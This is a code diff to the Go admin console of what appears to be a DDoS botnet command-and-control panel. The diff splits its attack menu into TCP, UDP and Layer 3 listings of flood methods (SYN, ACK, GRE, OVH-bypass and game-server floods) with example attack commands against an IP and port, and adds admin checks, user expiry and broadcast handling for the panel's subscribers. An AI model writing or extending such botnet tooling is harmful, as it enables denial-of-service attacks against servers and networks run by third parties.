@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"sort"
 	"strconv"
 	"strings"
 	"time"
@@ -473,47 +472,22 @@ func Admin(conn net.Conn) {
 
 		switch cmdName {
 
-		// Clear command
-		case "clear", "cls", "c":
-			session.History = make([]string, 0)
-			conn.Write([]byte("\033[2J\033[1H"))
-			writeAdminHeader(conn, session.User.Username)
-			continue
-
-		// Methods command
-		case "methods", "method", "syntax":
-			item := MethodsFromMapToArray(make([]string, 0))
-			sort.Slice(item, func(i, j int) bool {
-				return len(item[i]) < len(item[j])
-			})
-
-			rows := [][]string{
-				{".udpthread", ansiCommands + "udp flood with threads." + ansiReset},
-				{".synflood", ansiCommands + "tcp flood with syn flag." + ansiReset},
-				{".ackflood", ansiCommands + "tcp flood with ack flag." + ansiReset},
-				{".ppsflood", ansiCommands + "udp flood for high packets per seconds." + ansiReset},
-				{".sackflood", ansiCommands + "customer ack flood." + ansiReset},
-				{".tcpsocket", ansiCommands + "tcp flood for high connections per seconds" + ansiReset},
-				{".tcpstream", ansiCommands + "tcp custom flood for bypassing." + ansiReset},
-				{".stdhex", ansiCommands + "udp flood with random hex." + ansiReset},
-				{".stomp", ansiCommands + "stomp flood." + ansiReset},
-				{".vseflood", ansiCommands + "value source engine flood." + ansiReset},
-				{".greip", ansiCommands + "gre ip flood." + ansiReset},
-				{".tcpwra", ansiCommands + "tcp custom flood for games." + ansiReset},
-				{".ovh", ansiCommands + "tcp flood optimized for OVH bypass." + ansiReset},
-				{"", ""},
-				{"syntax", ansiCommands + ".stdhex 1.1.1.1 60 dport=80" + ansiReset},
-			}
-
-			writeGradientTable(session.Conn, []string{"Method", "Description"}, rows)
 		case "?", "help", "h":
 			rows := [][]string{
-				{"methods", ansiCommands + "view all methods available" + ansiReset},
-				{"clear", ansiCommands + "clears your terminal and history" + ansiReset},
+				{"methods_tcp", ansiCommands + "View all TCP methods available" + ansiReset},
+				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
+				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
+				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
 
 		case "admin?", "adminhelp":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
+				continue
+			}
+
 			rows := [][]string{
 				{"attacks", ansiCommands + "Enable or disable attacks possible" + ansiReset},
 				{"reset_user", ansiCommands + "Reset a user's attack logs" + ansiReset},
@@ -535,7 +509,53 @@ func Admin(conn net.Conn) {
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
 
-		case "attacks": // Enable/Disable attacks possible.
+		// Clear command
+		case "clear", "cls", "c":
+			session.History = make([]string, 0)
+			conn.Write([]byte("\033[2J\033[1H"))
+			writeAdminHeader(conn, session.User.Username)
+			continue
+
+		case "methods_tcp":
+			rows := [][]string{
+				{".synflood", ansiCommands + "TCP SYN flood" + ansiReset},
+				{".ackflood", ansiCommands + "TCP ACK flood" + ansiReset},
+				{".sackflood", ansiCommands + "TCP SACK flood" + ansiReset},
+				{".tcpstream", ansiCommands + "TCP stream flood" + ansiReset},
+				{".tcpsocket", ansiCommands + "TCP socket flood (high connections)" + ansiReset},
+				{".tcpwra", ansiCommands + "TCP wra flood (game servers)" + ansiReset},
+				{".ovh", ansiCommands + "TCP OVH bypass flood" + ansiReset},
+				{".stomp", ansiCommands + "TCP stomp flood" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".synflood 1.1.1.1 60 dport=80" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"TCP Methods", "Description"}, rows)
+
+		case "methods_udp":
+			rows := [][]string{
+				{".udpthread", ansiCommands + "UDP flood with threads" + ansiReset},
+				{".ppsflood", ansiCommands + "UDP flood high PPS" + ansiReset},
+				{".stdhex", ansiCommands + "UDP flood with random hex payload" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".udpthread 1.1.1.1 60 dport=80" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"UDP Methods", "Description"}, rows)
+
+		case "methods_l3", "methods_layer3":
+			rows := [][]string{
+				{".greip", ansiCommands + "GRE IP flood (Layer 3)" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".greip 1.1.1.1 60" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Layer 3 Methods", "Description"}, rows)
+
+		case "methods_layer7", "methods_l7":
+			rows := [][]string{
+				{"Not yet", ansiCommands + "No Layer 7 methods available" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+
+		case "attacks":
 			args := strings.Split(strings.ToLower(command), " ")[1:]
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
@@ -940,12 +960,24 @@ func Admin(conn net.Conn) {
 			continue
 
 		case "days":
+
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
 				continue
 			}
 
 			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Expiry > 0 {
+					expiryTime := time.Unix(session.User.Expiry, 0)
+					status = fmt.Sprintf("%s%s%s", ansiNumbers, expiryTime.Format("2006-01-02 15:04:05"), ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your expiry status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": days <number> <username>\r\n"))
+				continue
+			}
 
 			if len(args) <= 1 {
 				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
@@ -1022,25 +1054,33 @@ func Admin(conn net.Conn) {
 			session.Conn.Write([]byte(ansiSuccess + "User created successfully" + ansiReset + "\r\n"))
 			continue
 
-		case "remove": // Remove a choosen user from the database
+		case "remove":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
 				continue
 			}
 
-			args := strings.Split(command, " ")[1:]
+			args := strings.Fields(command)[1:] // Usa Fields para mejor manejo
 
-			if len(args) <= 0 {
+			//usage si solo se pone "remove" sin argumentos
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": remove <username>\r\n"))
+				continue
+			}
+
+			if len(args) < 1 {
 				session.Conn.Write([]byte(ansiWarning + "You must provide a username" + ansiReset + "\r\n"))
 				continue
 			}
 
-			if usr, _ := FindUser(args[0]); usr == nil || err != nil {
+			username := args[0]
+			usr, err := FindUser(username)
+			if err != nil || usr == nil {
 				session.Conn.Write([]byte(ansiError + "Unknown username" + ansiReset + "\r\n"))
 				continue
 			}
 
-			if err := RemoveUser(args[0]); err != nil {
+			if err := RemoveUser(username); err != nil {
 				session.Conn.Write([]byte(ansiError + "Failed to remove user" + ansiReset + "\r\n"))
 				continue
 			}
@@ -1048,16 +1088,25 @@ func Admin(conn net.Conn) {
 			session.Conn.Write([]byte(ansiSuccess + "Removed the user!" + ansiReset + "\r\n"))
 			continue
 
-		case "broadcast": // Broadcast a message to all the clients connected
-			message := strings.Join(strings.Split(command, " ")[1:], " ")
+		case "broadcast":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
 				continue
 			}
 
-			for _, s := range Sessions {
-				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K " + ansiSeparator + "[BROADCAST]" + ansiReset + " " + ansiSystem + fmt.Sprintf("%s", message) + ansiReset + "\x1b8"))
+			args := strings.Fields(command)[1:]
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Broadcast a message to all connected clients\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": broadcast <message>\r\n"))
+				continue
 			}
+
+			message := strings.Join(args, " ")
+			for _, s := range Sessions {
+				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K " + ansiSeparator + "[BROADCAST]" + ansiReset + " " + ansiSystem + message + ansiReset + "\x1b8"))
+			}
+			session.Conn.Write([]byte(ansiSuccess + "Broadcast sent\r\n" + ansiReset))
+			continue
 
 		case "users":
 			if !session.User.Admin {
